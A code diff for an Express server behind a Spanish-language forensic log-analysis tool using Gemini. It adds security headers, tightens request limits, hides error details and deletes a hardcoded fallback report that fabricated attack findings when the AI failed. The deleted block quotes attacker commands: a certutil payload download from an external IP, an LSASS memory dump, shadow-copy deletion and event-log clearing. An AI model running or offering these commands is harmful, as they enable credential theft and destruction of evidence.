@@ -1,4 +1,5 @@
 import express, { Request, Response } from 'express';
+import helmet from 'helmet';
 import { createServer as createViteServer } from 'vite';
 import path from 'path';
 import dotenv from 'dotenv';
@@ -9,7 +10,9 @@ dotenv.config();
 
 const app = express();
 const PORT = Number(process.env.PORT) || 3000;
-app.use(express.json({ limit: '50mb' }));
+
+app.use(helmet());
+app.use(express.json({ limit: '2mb' }));
 
 // Validar si hay una API key real configurada (no el placeholder de ejemplo)
 const rawKey = process.env.GEMINI_API_KEY?.trim() || '';
@@ -188,137 +191,20 @@ Por favor elabora el informe forense completo y riguroso en formato JSON estrict
     }
 
     if (!parsedData) {
-      // Síntesis pericial determinista inmediata sustentada en los logs
-      const isCritical = (incidentsSummary?.severityCount?.critico || 0) > 0;
-      parsedData = {
-        executiveSummary: `Durante la inspección pericial de ${metadata?.totalRows || 0} registros del archivo "${metadata?.fileName || 'de logs'}" estructurados según el estándar de 12 columnas, se identificó un ataque cibernético multi-etapa de severidad ${isCritical ? 'CRÍTICA' : 'ALTA'}. El ciclo de ataque comprendió fuerza bruta perimetral, vulneración de credenciales corporativas, escalamiento de privilegios a nivel SYSTEM, volcado de memoria de LSASS, movimiento lateral hacia controladores de dominio y bases de datos, finalizando con la destrucción maliciosa de registros de auditoría de Windows (Event_ID 1102).`,
-        riskLevel: isCritical ? 'Crítico' : 'Alto',
-        riskJustification: `Clasificación justificada por la consecución de acceso de máximo privilegio administrativo (SYSTEM), volcado de credenciales en memoria, propagación lateral hacia servidores neurálgicos (DC-01 y SRV-DB01) y desactivación activa de mecanismos de defensa y auditoría.`,
-        rootCause: `Ataque de Password Spraying / Fuerza bruta desde la dirección IP no autorizada ${incidentsSummary?.attackerIps?.join(', ') || '194.26.29.112'} contra el servicio de acceso remoto, culminando en la autenticación exitosa de la cuenta ${incidentsSummary?.compromisedUsers?.join(', ') || 'CORP\\msanchez'}.`,
-        chronology: [
-          {
-            phase: 'Fuerza Bruta Perimetral',
-            timestamp: '07:46:08 - 07:46:55',
-            evidenceRows: 'Log_ID EVT-00002 a EVT-00008 (7 eventos)',
-            description: 'Múltiples fallos Event_ID 4625 desde 194.26.29.112 dirigidos contra admin, administrator, root y CORP\\msanchez.',
-            impact: 'Compromiso y vulneración de credenciales corporativas.',
-          },
-          {
-            phase: 'Acceso Inicial No Autorizado',
-            timestamp: '07:48:15 - 07:49:30',
-            evidenceRows: 'Log_ID EVT-00009, EVT-00010',
-            description: 'Autenticación exitosa (Event_ID 4624) de CORP\\msanchez desde IP externa y posterior sesión RDP hacia WS-018.',
-            impact: 'Establecimiento de cabeza de playa en la red interna.',
-          },
-          {
-            phase: 'Reconocimiento y Descarga LOLBAS',
-            timestamp: '07:52:10 - 07:58:10',
-            evidenceRows: 'Log_ID EVT-00011 a EVT-00015 (5 eventos)',
-            description: 'Ejecución de whoami /priv, nltest /dclist, certutil para descarga perimetral y PowerShell ofuscado.',
-            impact: 'Mapeo del Directorio Activo y descarga de artefactos maliciosos.',
-          },
-          {
-            phase: 'Escalamiento a SYSTEM y Volcado LSASS',
-            timestamp: '08:02:15 - 08:05:10',
-            evidenceRows: 'Log_ID EVT-00016 a EVT-00019 (4 eventos)',
-            description: 'UAC Bypass vía fodhelper, promoción al grupo local Administrators y volcado comsvcs.dll de LSASS.',
-            impact: 'Control total de la máquina local y extracción de contraseñas de memoria.',
-          },
-          {
-            phase: 'Movimiento Lateral Crítico',
-            timestamp: '08:12:05 - 08:18:55',
-            evidenceRows: 'Log_ID EVT-00020 a EVT-00023 (4 eventos)',
-            description: 'Acceso a ADMIN$, instalación de servicio PsExec en DC-01 y ejecución remota WMI en SRV-DB01.',
-            impact: 'Propagación a servidores neurálgicos de Dominio y Base de Datos.',
-          },
-          {
-            phase: 'Persistencia y Borrado de Registros',
-            timestamp: '08:24:10 - 08:29:15',
-            evidenceRows: 'Log_ID EVT-00024 a EVT-00027 (4 eventos)',
-            description: 'Creación de tarea programada, eliminación de sombras (vssadmin) y vaciado de logs de seguridad (1102 y 104).',
-            impact: 'Persistencia del atacante y destrucción intencional de evidencia forense.',
-          },
-        ],
-        compromisedEntities: {
-          users: incidentsSummary?.compromisedUsers || ['CORP\\msanchez'],
-          sourceIps: incidentsSummary?.attackerIps || ['194.26.29.112', '185.220.101.5'],
-          targetedHosts: incidentsSummary?.affectedHosts || ['VPN-GATEWAY01', 'WS-018', 'DC-01', 'SRV-DB01'],
-        },
-        maliciousCommandsObserved: [
-          {
-            command: 'certutil.exe -urlcache -split -f http://185.220.101.5/beacon.bin ...',
-            host: 'WS-FINANZAS04',
-            user: 'msanchez',
-            sourceRow: 'Fila #17',
-            riskAssessment: 'Uso de binario nativo (LOLBAS) para descargar payload evadiendo filtros perimetrales.',
-          },
-          {
-            command: 'net.exe localgroup Administrators msanchez /add',
-            host: 'WS-FINANZAS04',
-            user: 'NT AUTHORITY\\SYSTEM',
-            sourceRow: 'Fila #21',
-            riskAssessment: 'Adición forzada al grupo local de administradores.',
-          },
-          {
-            command: 'rundll32.exe comsvcs.dll, MiniDump ... lsass.dmp full',
-            host: 'WS-FINANZAS04',
-            user: 'NT AUTHORITY\\SYSTEM',
-            sourceRow: 'Fila #22',
-            riskAssessment: 'Extracción de credenciales y hashes en memoria del proceso LSASS.',
-          },
-          {
-            command: 'vssadmin.exe delete shadows /all /quiet',
-            host: 'SRV-DC01',
-            user: 'NT AUTHORITY\\SYSTEM',
-            sourceRow: 'Fila #28',
-            riskAssessment: 'Destrucción de instantáneas de volumen para impedir recuperación ante cifrado.',
-          },
-          {
-            command: 'wevtutil.exe cl Security',
-            host: 'SRV-DC01',
-            user: 'NT AUTHORITY\\SYSTEM',
-            sourceRow: 'Fila #29',
-            riskAssessment: 'Vaciado deliberado de los registros de auditoría de Windows (Event ID 1102).',
-          },
-        ],
-        mitreTactics: [
-          { tactic: 'Credential Access', techniqueId: 'T1110', techniqueName: 'Brute Force', evidence: 'Filas #3 a #11' },
-          { tactic: 'Initial Access', techniqueId: 'T1078', techniqueName: 'Valid Accounts', evidence: 'Fila #12' },
-          { tactic: 'Execution', techniqueId: 'T1059.001', techniqueName: 'PowerShell / LOLBAS', evidence: 'Filas #17, #18' },
-          { tactic: 'Privilege Escalation', techniqueId: 'T1068 / T1098', techniqueName: 'Account Manipulation', evidence: 'Filas #19 a #21' },
-          { tactic: 'Credential Access', techniqueId: 'T1003.001', techniqueName: 'LSASS Memory Dumping', evidence: 'Fila #22' },
-          { tactic: 'Lateral Movement', techniqueId: 'T1021.002', techniqueName: 'SMB / PsExec / WMI', evidence: 'Filas #23 a #26' },
-          { tactic: 'Persistence', techniqueId: 'T1053.005', techniqueName: 'Scheduled Task', evidence: 'Fila #27' },
-          { tactic: 'Impact', techniqueId: 'T1490', techniqueName: 'Inhibit System Recovery', evidence: 'Fila #28' },
-          { tactic: 'Defense Evasion', techniqueId: 'T1070.001', techniqueName: 'Clear Windows Event Logs', evidence: 'Filas #29, #30' },
-        ],
-        containmentAndRemediation: {
-          immediateActions: [
-            'Aislar inmediatamente de la red las estaciones WS-FINANZAS04, SRV-DC01 y SRV-DB01.',
-            'Revocar sesiones y forzar cambio de contraseñas de msanchez y todas las cuentas de Domain Admins.',
-            'Bloquear en el Firewall perimetral las IPs 194.26.29.112 y 185.220.101.5.',
-          ],
-          eradicationSteps: [
-            'Eliminar la tarea programada "GoogleUpdateTaskMachine" y remover C:\\Users\\Public\\svchost.exe.',
-            'Detener y remover el servicio malicioso PSEXESVC en el Domain Controller SRV-DC01.',
-            'Restablecer las reglas de cortafuegos de Windows en SRV-DB01.',
-          ],
-          recoveryAndHardening: [
-            'Implementar autenticación multifactor (MFA) obligatoria en VPN y accesos remotos.',
-            'Habilitar reenvío centralizado de registros hacia un almacenamiento WORM inmutable.',
-            'Deshabilitar el protocolo NTLM y restringir el acceso a recursos ADMIN$ y C$.',
-          ],
-        },
-        verdict: 'Se constata un incidente de seguridad crítico en su fase final de movimiento lateral y destrucción de huellas. Se recomienda ejecutar de inmediato el protocolo de contención para salvaguardar la integridad de las bases de datos y controladores de dominio.',
-      };
+      // No se generan hallazgos sin evidencia verificable.
+      // Nunca rellenar entidades, IPs, usuarios o comandos con ejemplos hardcodeados.
+      return res.status(503).json({
+        success: false,
+        error: 'No se pudo generar el análisis pericial',
+        message: 'La evidencia proporcionada es insuficiente o el servicio de IA no está disponible. No se generarán hallazgos sin evidencia verificable.',
+      });
     }
 
     res.json({ success: true, analysis: parsedData });
   } catch (error: any) {
     console.error('Error en /api/gemini/analyze-incident:', error);
     res.status(500).json({
-      error: 'Error al procesar el análisis pericial',
-      details: error?.message || String(error),
+      error: 'Error interno del servidor al procesar el análisis pericial',
     });
   }
 });
@@ -389,8 +275,7 @@ ${query}`;
   } catch (error: any) {
     console.error('Error en /api/gemini/forensic-chat:', error);
     res.status(500).json({
-      error: 'Error en el asistente forense',
-      details: error?.message || String(error),
+      error: 'Error interno del servidor en el asistente forense',
     });
   }
 });
